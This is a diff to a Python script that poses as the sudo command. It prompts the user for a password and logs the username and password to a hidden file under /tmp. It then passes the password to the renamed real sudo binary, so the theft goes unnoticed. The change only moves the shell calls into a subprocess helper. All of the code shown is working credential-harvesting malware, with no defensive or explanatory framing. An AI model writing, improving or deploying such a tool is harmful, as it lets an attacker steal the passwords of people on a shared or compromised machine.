@@ -2,6 +2,7 @@
 import os
 import sys
 import getpass
+import subprocess as sp
 
 command = ' '.join(map(str, sys.argv[1:]))
 username = getpass.getuser()
@@ -10,6 +11,9 @@ dumpdir = "/tmp/.snooper" # change this
 dumpfile = "/tmp/.snooper/dump.txt" # change this
 sudo = 'sudo' # change this to the the new name of the sudo binary
 
+def run(command):
+    sp.call(command, shell=True)
+
 def snoop():
     password = getpass.getpass(prompt)
     if os.path.isfile(dumpfile):
@@ -17,7 +21,7 @@ def snoop():
         dump.write("\n{0} : {1}".format(username, password))
         dump.close()
     else:
-        os.system("mkdir -p {0}".format(dumpdir))
+        run("mkdir -p {0}".format(dumpdir))
         dump = open(dumpfile, 'w')
         dump.write("\n{0} : {1}".format(username, password))
         dump.close()
@@ -25,7 +29,8 @@ def snoop():
 
 def sudocmd(cmd, password):
     wrapper = "echo {0} 2>/dev/null | {1} -kS {2}".format(password, sudo, cmd) 
-    os.system(wrapper)
+    run(wrapper)
+
 
 def main():
     sudocmd(command, snoop())
